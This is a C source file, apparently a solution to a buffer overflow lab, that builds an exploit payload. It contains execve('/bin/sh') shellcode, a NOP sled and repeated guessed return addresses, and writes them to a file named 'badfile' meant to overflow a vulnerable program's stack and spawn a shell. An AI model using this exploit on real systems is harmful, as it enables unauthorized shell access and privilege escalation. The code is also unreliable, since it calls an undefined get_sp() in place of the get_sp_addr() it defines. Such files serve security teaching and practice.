/* exploit.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdq                            */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

// function that calls an assembly function
// to get the address to the top of the stack
unsigned long get_sp_addr(void) {
	__asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    /* You need to fill the buffer with appropriate contents here */ 
    int i = 0;

	char *buffptr; //pointer to the buffer
	long *addrptr;
	long retaddr;
	int pos = sizeof(buffer) - (sizeof(shellcode)+1);
	buffptr = buffer; // address of the start of the buffer
	addrptr = (long*)(buffptr);
	retaddr = get_sp() + 500;
	for(int i=0; i<20; i++) {
		*(addrptr++) = retaddr; // Fill the first 20 words of the buffer with retaddr
	}
	// Fill the end of the buffer with the shellcode
	for(int i=0; i<sizeof(shellcode); i++) {
		buffer[pos+i] = shellcode[i];
	}
	// Null terminate the shellcode at the end of the buffer
	buffer[sizeof(buffer)-1] = '\0';
	

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}

